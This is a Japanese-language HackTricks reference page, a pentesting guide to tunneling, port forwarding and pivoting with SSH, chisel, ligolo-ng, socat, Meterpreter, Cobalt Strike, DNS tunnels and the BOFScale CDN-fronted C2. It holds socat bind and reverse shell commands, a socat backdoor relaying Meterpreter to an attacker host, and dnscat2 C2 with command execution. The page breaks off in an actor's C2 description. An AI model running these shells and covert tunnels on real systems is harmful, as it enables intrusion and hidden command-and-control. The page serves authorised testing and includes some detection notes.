# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> NmapのproxyサポートはTCP接続に限定されており、ping、port、OS-detection scanには影響しません。scannerがSOCKS proxyの背後にある場合は、**host discoveryを無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後のcommandでは、アカウントとWinRM hostを識別するためにEvil-WinRMの`-u`および`-i`オプションを使用します。WinRMのデフォルトportは5985です。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH は、暗号化された channel を介して X11 接続、任意の TCP ポート、Unix ドメインソケットを forward できます。<sup>[[6]](#references)</sup>

SSH グラフィカル接続 (X)

`-Y` は trusted X11 forwarding を有効にし、`-C` は forwarding されるデータの compression を要求します。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server に新しい Port を開く --> Other port

Remote (`-R`) forwarding は SSH server で待ち受け、local 側に接続します。明示的な bind address により、その listener にアクセスできる interface が制御されます。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local（`-L`）forwarding は client 側で listen し、SSH server 側から destination に接続します。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の場所

Dynamic (`-D`) forwarding は、接続がリモート側から開かれるローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### ProxyJump による Multi-hop

`-J`/`ProxyJump` は、1つ以上のカンマ区切りの jump host を経由して target に接続します。Forwarding options は最終的な SSH connection に属するため、以下の SOCKS listener は最初の bastion ではなく、`internal-target` から destination を開きます。これにより、jump host にログインしてそこで2つ目の SSH client を起動する必要がなくなります。<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
ジャンプマシン固有のオプションは `~/.ssh/config` に配置してください。宛先向けのコマンドライン設定は、中間ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、DMZ 経由で内部ホストから自分のホストへ reverse shell を取得する場合に便利です。

サーバーの `GatewayPorts` 設定は、remote forward が loopback の外部に bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

この root-based の例では、両方のホストに tunnel devices を作成します。サーバーでは tun forwarding を許可し、選択したアカウントが tun device にアクセスできる必要があります。ここで `root` アカウントを使用する方法の1つは、`PermitRootLogin yes` を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server 側で forwarding を有効化する
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 では、Terrapin の初期トランスポート整合性攻撃に対抗するため、strict-KEX 拡張が追加されました。可能な場合は両方の peer を更新し、古い実装については、forwarded channel がバージョンだけで保護されていると判断せず、vendor のガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、**ssh** で **subnetwork** へのすべての **traffic** を **tunnel** できます。\
たとえば、10.10.10.0/24 宛てのすべての traffic を転送します。

`sshuttle` は SSH 経由の透過的なプロキシを提供し、以下に示すように、subnet とカスタム SSH コマンドを選択できます。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit の `portfwd` は local forwarding と remote forwarding をサポートします。一方、SOCKS proxy module は session routes または `autoroute` と連携して動作することを想定しており、これらの例ではデフォルトで port 1080 を listen します。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt StrikeのBeaconは、Beacon経由でSOCKS4a/SOCKS5接続を中継できます。`rportfwd`は侵害したホスト上でbindし、`rportfwd_local`はCobalt Strike clientから宛先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon経由でトラフィックをルーティングするインターフェース上のTeam Serverのportを開きます。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port は Beacon host 上で開かれ**、Team Server 上では開かれません。また、traffic は Team Server に送信され、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
reverse-forwarding manual では、以下の動作が記載されています。<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間でリレーするためではなく、Team Server へのトラフィックをトンネルするように設計されています**。
- トラフィックは、P2P リンクを含む **Beacon の C2 トラフィック内でトンネルされます**。
- 高いポート番号は通常、特権ポートの制限を回避しますが、対象 OS のポリシーと既存のリスナーは引き続き適用されます。

### rPort2Port local

> [!WARNING]
> この場合、**ポートは Team Server ではなく Beacon host で開かれ**、**トラフィックは Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port に送信されます。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) は、TUN driver や service をインストールせずに、Windows C2 implant 内で modified Tailscale overlay を実行します。3つの component は、asynchronous CGo `c-shared` `tailscaled` BOF-PE、local API と通信する小型の C++ BOF-PE、そして asynchronous な `socksportfwd` TCP-to-SOCKS5 bridge です。<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 and DERP

Tailscale は通常、Noise-based TS2021 control channel と DERP relay に proprietary HTTP upgrades を使用します。BOFScale はこれらの byte stream を維持したまま、RFC 6455 WebSockets に載せ、`Sec-WebSocket-Protocol: ts2021` または `derp` を使用します。これにより、operator が制御する Headscale/DERP origin を、standard WebSocket upgrades のみを受け付ける CDN の背後に配置できます。patched client は HTTP `500` の後に TS2021 over WebSockets を retry し、HTTP `426` の後に DERP を retry します。また、DERP WebSocket dialer が host proxy configuration に従うようにします。BOF は `TS_DEBUG_DERP_WS_CLIENT=1` を設定し、既知の失敗する first attempt をスキップします。<sup>[[53]](#references)[[54]](#references)</sup>

CDN と origin proxy は、`/ts2021` および `/derp` に対する WebSocket upgrades を保持し、`/key` を通常の HTTP として forward し、relay session が無期限に open のままになる可能性があるため、internal read/write timeouts を無効にする必要があります。付属の Headscale configuration は `verify_clients` を有効にし、operator の embedded DERP map のみを公開し、Tailscale-operated relay への fallback を防ぐために `derp.urls` を空のままにします。<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon and named-pipe control

override されない限り、BOF entry point は `-tun=userspace-networking`、`-state mem:`、`-no-logs-no-support` を指定して `tailscaled` を起動し、その後 UUID-named pipe を作成します。Go stdout/stderr は OS pipe 経由で Beacon output API に redirect されるため、daemon と Go runtime 全体は resident のままですが、state と logs は Tailscale directory に書き込まれません。<sup>[[53]](#references)[[54]](#references)</sup>

lightweight client は、その pipe 上で Tailscale の HTTP/1.0 local API を再現します。daemon の `safesocket` layer が pipe client を impersonate するため、`SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` を指定して pipe を開き、`Tailscale-Cap: 125` を送信し、local API を `up`、`down`、`status`、route advertisement、shutdown operation に map します。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemon に shutdown を要求した後、manually mapped Go BOF-PE を unload しないでください。runtime と garbage-collector goroutine は、loader が unmap した memory から実行を継続する可能性があります。`tailscaled` は sacrificial process 内で実行し、最終的な cleanup ではその process を terminate してください。<sup>[[54]](#references)</sup>

### Bridge host-originated traffic through userspace SOCKS5

Inbound tailnet connection と advertised subnet route は userspace network stack 内で機能しますが、compromised host 上の通常の process には overlay への OS route がありません。そのため `socksportfwd` は victim-facing TCP port を listen し、daemon の `0.0.0.0:1080` listener と SOCKS5 `NO AUTH` negotiation を行い、tailnet destination に対して `CONNECT` を発行し、両方向を asynchronous に relay します。target が MagicDNS name の場合は `ATYP_DOMAIN` を使用するため、`tailscaled` がその name を解決し、Windows resolver に公開されることを防ぎます。<sup>[[53]](#references)[[54]](#references)</sup>

以下に minimal operator flow を示します。stock Tailscale はこの CDN design を traverse できないため、operator node と implant の両方で patched binaries を使用する必要があります。<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
ローカルフォワードにより、見かけ上の認証リスナーをリレー tool から分離できます。マシンに侵害したホストの bind port へ認証するよう強制し、それを tailnet 経由で `ntlmrelayx` に転送して、AD CS、LDAP、HTTP、SMB、またはその他の互換性のある target へ relay できます。脆弱性固有の段階については、[WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) および [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) を参照してください。BOFScale は transport にすぎません。<sup>[[54]](#references)</sup>

### 検知

単一の弱い indicator ではなく、次の組み合わせを探します。通常は Go ベースではない process 内の Go runtime、permissive な SDDL `D:(A;;GA;;;WD)` を持つ UUID pipe、予期しない `0.0.0.0:1080` SOCKS listener、CDN address への長時間存続する TLS WebSockets です。TLS inspection を使用する場合、所有 process が認証済みの `tailscaled` service でないにもかかわらず、`Sec-WebSocket-Protocol: derp` または `ts2021` があるものを検知します。repository の `bofscale.yar` rules は、3 つすべての BOF-PE components に対する memory signatures を提供します。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

この project は、`tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの web tunnel endpoints を提供します。local proxy を開始する前に、対応している endpoint を 1 つ upload してください。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます。\
Chisel は、SSH で保護された接続を使用して HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server build を使用し、選択した release の command syntax を確認してください。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC 上の HTTP/3）経由で静的または動的なフォワードを実行します。現在のビルドは、TCP、UDP、Unix ソケット、stdio、SOCKS5、HTTP proxying、および Linux の transparent-proxy listener を、forward mode と reverse mode の両方でサポートしています。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

attacker 上で server を実行し、`-R` を使用して pivot から outbound 接続を確立します。この方向では SOCKS5 listener は **server** 上に作成され、要求された接続は **client/pivot** の network から開始されます。<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
reverse static forward は同じ方向を使用します。例えば、次の例では、pivot から到達できる `10.10.10.20:445` を、attacker の loopback ポート `8445` に公開します：<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Egress と transport の詳細

- 明示的な HTTP proxy を経由するには、client に `-p http://user:pass@proxy:8080` を追加します。`curl` などの client では `socks5h://127.0.0.1:1080` を使用する（またはアプリケーションで proxied DNS を有効にする）ことで、internal name がローカルの resolver に漏洩せず、tunnel の先で解決されます。<sup>[[52]](#references)</sup>
- `wss://` は TLS で保護された WebSocket を選択します。`https://` client は HTTP/2 を選択しますが、reverse proxy/CDN による buffering や HTTP/1 への変換によって双方向 stream が壊れることがよくあります。この mode をテストする場合は、wstunnel server を直接公開してください。<sup>[[52]](#references)</sup>
- `wts://` は QUIC 上の WebTransport を選択します。`--enable-webtransport`（または `wts://` listen URL）を指定して server を起動し、listen port で UDP を許可します。この mode は、通常の HTTP `CONNECT` proxy を通過できません。その proxy は TCP を転送するためです。<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream project は、組み込みの self-signed certificate を privacy protection として扱わないよう警告しています。有効な custom certificate と `--tls-verify-certificate`（または mTLS）を優先し、remote access が意図されている場合を除いて proxy listener は loopback に限定してください。機密性が重要な場合は、すでに secure な protocol を tunnel してください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng の quickstart では、proxy 上の TUN interface、agent に対する certificate-fingerprint validation、および tunneled network 用の route setup について説明しています。<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agentのバインドとリスニング

Ligolo-ngは、proxy側のアドレスへ転送するlistenerをAgent上に追加でき、予約済みの`240.0.0.0/4`範囲をルーティングしてAgentローカルのサービスに到達できます。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agentのローカルポートへのアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotはvictimからreverse tunnelを開始し、attackerのloopback address上にSOCKS4 proxyを公開します。READMEには、NTLM-proxyのcredentialsおよびhash optionsについても記載されています。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** 経由で Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は、`TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などの address type を組み合わせます。以下の例では、ドキュメントに記載されているこれらの endpoint を組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks 経由の Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat 経由の Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
socatで文書化されている`PROXY`アドレスタイプを使用し、被害者のコンソールで最後の行の代わりに次の行を実行することで、**認証不要のプロキシ**を経由できます。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client と Server の両側で証明書を作成する
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルの SSH ポート（22）を攻撃者ホストの 443 ポートに接続する
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plinkは、`ssh`と同様のSSH forwardingオプションを備えた、PuTTYのコマンドライン接続ツールです。<sup>[[22]](#references)</sup>

SSH portには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、process listにpasswordを露出させるため、可能な場合はkey authenticationまたは`-pwfile`を優先してください。<sup>[[22]](#references)[[23]](#references)</sup>

このbinaryはvictim上で実行され、SSH clientであるため、reverse connection用にSSH serviceとportを開いてください。以下では`-R`を使用して、locally accessibleなportをattackerのmachineへforwardします。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストが必要とする権限を持つコンテキストを使用してください。Microsoft は、以下で使用する `v4tov4` の add、show、delete 形式をドキュメント化しています。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

システムへの **RDP access** が必要です。\
Download:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使用して、既存の RDP session 経由で SOCKS5 connection を転送します。client plugin は `127.0.0.1:1080` で listen し、server component は RDP target 上で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - この tool は Windows の Remote Desktop Service feature に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は **RDP connection 経由で packets を tunneling する**役割を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

client computer で **`SocksOverRDP-Plugin.dll`** を次のように load します：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
これで、**`mstsc.exe`** を使用して **RDP** 経由で **victim** に **connect** でき、**SocksOverRDP plugin is enabled** であり、**127.0.0.1:1080** で **listen** するという **prompt** が表示されるはずです。

**RDP** 経由で **connect** し、victim machine に `SocksOverRDP-Server.exe` binary を upload & execute します：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
次に、あなたの machine（attacker）で port 1080 が listening していることを確認します:
```
netstat -antb | findstr 1080
```
これで[**Proxifier**](https://www.proxifier.com/)を使用して、トラフィックをそのポート経由でプロキシできます。<sup>[[26]](#references)</sup>

## Proxify Windows GUIアプリ

[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリがプロキシ経由で通信するようにできます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers**で、SOCKSサーバーのIPとポートを追加します。\
**Profile -> Proxification Rules**で、プロキシ経由にするプログラムの名前と、プロキシ経由にするIPへの接続を追加します。Proxifierのルールでは、アプリケーション、対象ホスト、ポートを条件にできます。<sup>[[27]](#references)</sup>

## NTLMプロキシ経由でTunnelする

前述のツールである**Rpivot**は、NTLM認証を行うプロキシ経由でrelayできます。**OpenVPN**も、auth fileとNTLMv2 methodを使用するように設定すれば、プロキシ経由でrouteできます。これはproxy traversalであり、プロキシ認証のbypassではありません。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm は上流の NTLM プロキシに認証し、ローカルリスナーを公開して、ローカルのトンネルポートを宛先サービスにマッピングできます。これにより、クライアントはそのローカルポートを使用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート 443 を転送するには
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
例えば、victim 側で **SSH** service が port 443 で listen するように設定すると、attacker 側の port 2222 を介して接続できます。<sup>[[29]](#references)</sup>\
また、attacker が port 2222 で listen している間、localhost:443 に接続する **meterpreter** を使用することもできます。<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) は、Microsoft の .NET reverse-proxy toolkit です。こちらで確認できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine は DNS queries を介して IPv4 tunnel を作成し、TUN interfaces を使用します。ドキュメントに記載されている setup では、両端でそれらの interfaces を作成するために必要な privileges が求められます。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport は direct TCP よりオーバーヘッドが大きく、通常は低速です。このトンネルを通じて圧縮 SSH connection を作成するには、次を使用できます:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 は DNS を介して暗号化された command-and-control channel を確立します。以下の server および client コマンドは、公式ドキュメントに記載された使用方法に従っています。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用すると、PowerShellでdnscat2 clientを実行できます。READMEには、以下に示す`Start-Dnscat2`のparametersが記載されています。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat による port forwarding**

Dnscat2 の interactive な `listen` command は、local listener を remote host と port にマッピングします。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS の変更

Proxychains-ng は動的リンクされた TCP 接続をフックしますが、UDP や ICMP を転送できません。DNS proxying は設定可能なため、固定のパブリック resolver を前提にせず、インストール済みの `proxychains.conf` と resolver helper を確認してください。Legacy の `proxyresolv` scripts では resolver の選択に `PROXY_DNS_SERVER` を使用できます。内部の名前解決が必要な場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Go の Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、アウトバウンドの **DNS** と **plain HTTP POST** traffic のみを悪用する **dual-channel C2 ("AK47C2")** を作成しました。これは corporate networks でブロックされることが少ない 2 つの protocol です。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• ランダムな 5 文字の SessionID（例: `H4T14`）を生成します。
